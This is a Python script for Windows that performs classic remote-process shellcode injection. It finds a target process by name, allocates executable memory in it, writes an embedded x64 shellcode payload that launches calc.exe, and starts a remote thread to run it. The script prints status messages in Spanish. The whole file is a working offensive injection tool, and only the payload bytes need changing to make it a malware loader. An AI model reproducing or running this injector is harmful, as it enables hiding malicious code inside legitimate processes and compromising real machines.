import sys
import ctypes
from typing import Optional

import psutil
import win32api
import win32con
import pywintypes
import win32process


INHERIT_HANDLE = False
STARTING_ADDRESS = 0x0
SECURITY_ATTRIBUTES = None
STACK_SIZE= 0x0
BASE_ADDRESS_PARAMETER = 0x0
FLAGS = 0x0


def search_process_by_name(name: str) -> Optional[int]:
    for proceso in psutil.process_iter(attrs=['pid', 'name']):
        if proceso.info["name"] == name:
            return proceso.info["pid"]
    return None


def open_process(pid: int) -> pywintypes.HANDLE:
    return win32api.OpenProcess(
        win32con.PROCESS_ALL_ACCESS,
        INHERIT_HANDLE,
        pid,
    )


def reserve_memory(process: pywintypes.HANDLE, buffer_len: int) -> int:
    return win32process.VirtualAllocEx(
        process,
        STARTING_ADDRESS,
        buffer_len,
        win32con.MEM_COMMIT | win32con.MEM_RESERVE,
        win32con.PAGE_EXECUTE_READWRITE,
    )


def write_process_memory(
    process: pywintypes.HANDLE,
    base_address: int,
    buffer: bytes
) -> bool:
    return win32process.WriteProcessMemory(
        process,
        base_address,
        buffer,
    )


def create_thread(
    process: pywintypes.HANDLE,
    base_address: int,
) -> tuple:
    return win32process.CreateRemoteThread(
        process,
        SECURITY_ATTRIBUTES,
        STACK_SIZE,
        base_address,
        BASE_ADDRESS_PARAMETER,
        FLAGS,
    )


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("[x] Se requiere el nombre del proceso.")
        sys.exit(1)

    payload =  b""
    payload += b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51"
    payload += b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
    payload += b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
    payload += b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
    payload += b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    payload += b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
    payload += b"\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
    payload += b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
    payload += b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
    payload += b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    payload += b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
    payload += b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
    payload += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
    payload += b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
    payload += b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    payload += b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
    payload += b"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48"
    payload += b"\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d"
    payload += b"\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5"
    payload += b"\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
    payload += b"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
    payload += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89"
    payload += b"\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"

    process_name = sys.argv[1]
    pid = search_process_by_name(process_name)
    if not pid:
        print("[x] No existe el proceso.")
        sys.exit(1)

    try:

        process = open_process(pid)
        print(f"[+] Process opened: {pid}")

        base_address = reserve_memory(
            process=process,
            buffer_len=len(payload),
        )
        print(f"[+] Base address: {hex(base_address)}")

        write_process_memory(
            process=process,
            base_address=base_address,
            buffer=payload,
        )
        print("[+] Memory space was written.")

        thread, tid = create_thread(
            process=process,
            base_address=base_address,
        )
        print(f"[+] Thread created in: {tid}")

        win32api.CloseHandle(thread)

    except Exception as e:
        print(f"[x] Error: {e.args[2]}")
        sys.exit(1)